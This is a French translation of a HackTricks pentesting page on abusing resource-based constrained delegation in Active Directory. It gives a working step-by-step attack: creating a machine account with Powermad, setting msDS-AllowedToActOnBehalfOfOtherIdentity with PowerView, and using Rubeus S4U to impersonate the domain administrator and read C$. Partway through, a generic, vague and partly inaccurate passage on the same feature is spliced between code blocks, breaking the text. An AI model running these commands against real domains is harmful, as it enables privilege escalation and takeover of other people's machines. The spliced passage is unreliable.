## Fondamentaux de la délégation contrainte basée sur les ressources

Ceci est similaire à la délégation contrainte de base, mais **au lieu de donner des autorisations à un objet pour qu'il puisse se faire passer pour n'importe quel utilisateur contre un service**. La délégation contrainte basée sur les ressources **définit dans l'objet qui est capable de se faire passer pour n'importe quel utilisateur contre lui**.

Dans ce cas, l'objet contraint aura un attribut appelé _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ avec le nom de l'utilisateur qui peut se faire passer pour n'importe quel autre utilisateur contre lui.

Une autre différence importante de cette délégation contrainte par rapport aux autres délégations est que tout utilisateur disposant de **permissions d'écriture sur un compte de machine** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) peut définir le _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ (dans les autres formes de délégation, vous aviez besoin de privilèges d'administrateur de domaine).

### Nouveaux concepts

Dans la délégation contrainte, il a été dit que le drapeau **`TrustedToAuthForDelegation`** à l'intérieur de la valeur _userAccountControl_ de l'utilisateur est nécessaire pour effectuer un **S4U2Self**. Mais ce n'est pas tout à fait vrai.\
La réalité est que même sans cette valeur, vous pouvez effectuer un **S4U2Self** contre n'importe quel utilisateur si vous êtes un **service** (avez un SPN), mais si vous **avez `TrustedToAuthForDelegation`**, le TGS retourné sera **Forwardable** et si vous **n'avez pas** ce drapeau, le TGS retourné ne sera **pas** Forwardable.

Cependant, si le **TGS** utilisé dans **S4U2Proxy** n'est **pas Forwardable**, essayer d'exploiter une **délégation contrainte de base** ne **fonctionnera pas**. Mais si vous essayez d'exploiter une **délégation contrainte basée sur les ressources, cela fonctionnera** (ce n'est pas une vulnérabilité, c'est une fonctionnalité, apparemment).

### Structure de l'attaque

> Si vous avez des **privilèges équivalents en écriture** sur un compte **ordinateur**, vous pouvez obtenir un **accès privilégié** sur cette machine.

Supposons que l'attaquant ait déjà des **privilèges équivalents en écriture sur l'ordinateur de la victime**.

1. L'attaquant **compromet** un compte qui a un **SPN** ou **en crée un** ("Service A"). Notez que **n'importe quel** _utilisateur administrateur_ sans aucun autre privilège spécial peut **créer** jusqu'à 10 **objets ordinateur (**_**MachineAccountQuota**_**)** et leur attribuer un SPN. L'attaquant peut donc simplement créer un objet ordinateur et définir un SPN.
2. L'attaquant **exploite son privilège d'écriture** sur l'ordinateur de la victime (ServiceB) pour configurer une **délégation contrainte basée sur les ressources pour permettre à ServiceA de se faire passer pour n'importe quel utilisateur** contre cet ordinateur de la victime (ServiceB).
3. L'attaquant utilise Rubeus pour effectuer une **attaque S4U complète** (S4U2Self et S4U2Proxy) de Service A à Service B pour un utilisateur **avec un accès privilégié à Service B**.
   1. S4U2Self (à partir du compte compromis/créé avec SPN) : Demande un **TGS de l'administrateur pour moi** (non Forwardable).
   2. S4U2Proxy : Utilise le **TGS non Forwardable** de l'étape précédente pour demander un **TGS** de **l'administrateur** à l'**hôte victime**.
   3. Même si vous utilisez un TGS non Forwardable, comme vous exploitez une délégation contrainte basée sur les ressources, cela fonctionnera.
4. L'attaquant peut **passer le ticket** et **se faire passer pour** l'utilisateur pour obtenir **un accès au ServiceB de la victime**.

Pour vérifier le _**MachineAccountQuota**_ du domaine, vous pouvez utiliser :
```
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Attaque

### Création d'un objet ordinateur

Vous pouvez créer un objet ordinateur dans le domaine en utilisant [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```csharp
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```
![](../../.gitbook/assets/b1.png)

# Délégation contrainte basée sur les ressources

La délégation contrainte basée sur les ressources est une fonctionnalité d'Active Directory qui permet à un utilisateur de se voir accorder des autorisations pour accéder à une ressource spécifique, telle qu'un serveur de fichiers, sans avoir à accorder des autorisations supplémentaires à l'utilisateur. Cette fonctionnalité est utile pour les environnements où les utilisateurs ont besoin d'accéder à des ressources spécifiques sans avoir à accorder des autorisations supplémentaires à l'utilisateur.

## Comment cela fonctionne-t-il?

La délégation contrainte basée sur les ressources fonctionne en permettant à un administrateur de définir des autorisations pour un utilisateur spécifique sur une ressource spécifique. Lorsque l'utilisateur tente d'accéder à la ressource, Active Directory vérifie les autorisations de l'utilisateur et de la ressource pour déterminer si l'utilisateur est autorisé à accéder à la ressource.

## Comment exploiter la délégation contrainte basée sur les ressources?

La délégation contrainte basée sur les ressources peut être exploitée en utilisant une attaque de type "Pass-the-Ticket" ou "Pass-the-Hash". Ces attaques permettent à un attaquant de se faire passer pour un utilisateur légitime et d'accéder à des ressources auxquelles l'utilisateur a accès.

Pour exploiter la délégation contrainte basée sur les ressources, un attaquant doit d'abord identifier les comptes d'utilisateurs qui ont des autorisations pour accéder à des ressources spécifiques. Une fois que l'attaquant a identifié ces comptes, il peut utiliser une attaque "Pass-the-Ticket" ou "Pass-the-Hash" pour se faire passer pour l'utilisateur et accéder à la ressource.

## Comment se protéger contre l'exploitation de la délégation contrainte basée sur les ressources?

Pour se protéger contre l'exploitation de la délégation contrainte basée sur les ressources, il est recommandé de suivre les bonnes pratiques de sécurité suivantes:

- Évitez d'utiliser la délégation contrainte basée sur les ressources autant que possible.
- Utilisez des comptes de service pour accéder aux ressources plutôt que des comptes d'utilisateurs.
- Utilisez des groupes de sécurité pour gérer les autorisations d'accès aux ressources.
- Surveillez les journaux d'événements pour détecter les tentatives d'exploitation de la délégation contrainte basée sur les ressources.
- Mettez à jour régulièrement les systèmes pour corriger les vulnérabilités connues.
```bash
Get-DomainComputer SERVICEA #Check if created if you have powerview
```
### Configuration de la délégation contrainte basée sur les ressources

**Utilisation du module PowerShell activedirectory**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Utilisation de Powerview**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Réalisation d'une attaque S4U complète

Tout d'abord, nous avons créé le nouvel objet Ordinateur avec le mot de passe `123456`, nous avons donc besoin du hash de ce mot de passe :
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Cela affichera les hachages RC4 et AES pour ce compte.\
Maintenant, l'attaque peut être effectuée :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Vous pouvez générer plusieurs tickets en ne faisant qu'une seule demande en utilisant le paramètre `/altservice` de Rubeus :
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Notez que les utilisateurs ont un attribut appelé "**Ne peut pas être délégué**". Si un utilisateur a cet attribut à True, vous ne pourrez pas vous faire passer pour lui. Cette propriété peut être vue dans bloodhound.
{% endhint %}

![](../../.gitbook/assets/B3.png)

### Accès

La dernière ligne de commande effectuera l'**attaque S4U complète et injectera le TGS** d'Administrateur dans la mémoire de l'hôte victime.\
Dans cet exemple, un TGS pour le service **CIFS** a été demandé à partir d'Administrateur, vous pourrez donc accéder à **C$**.
```bash
ls \\victim.domain.local\C$
```
### Abus de différents tickets de service

Apprenez-en davantage sur les [**tickets de service disponibles ici**](silver-ticket.md#available-services).

## Erreurs Kerberos

* **`KDC_ERR_ETYPE_NOTSUPP`**: Cela signifie que Kerberos est configuré pour ne pas utiliser DES ou RC4 et que vous fournissez uniquement le hachage RC4. Fournissez à Rubeus au moins le hachage AES256 (ou fournissez-lui les hachages rc4, aes128 et aes256). Exemple: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Cela signifie que l'heure de l'ordinateur actuel est différente de celle du DC et que Kerberos ne fonctionne pas correctement.
* **`preauth_failed`**: Cela signifie que le nom d'utilisateur + les hachages fournis ne fonctionnent pas pour se connecter. Vous avez peut-être oublié de mettre le "$" à l'intérieur du nom d'utilisateur lors de la génération des hachages (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Cela peut signifier:
  * L'utilisateur que vous essayez d'usurper ne peut pas accéder au service souhaité (parce que vous ne pouvez pas l'usurper ou parce qu'il n'a pas suffisamment de privilèges)
  * Le service demandé n'existe pas (si vous demandez un ticket pour winrm mais que winrm ne fonctionne pas)
  * Le fakecomputer créé a perdu ses privilèges sur le serveur vulnérable et vous devez les lui redonner.

## Références

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
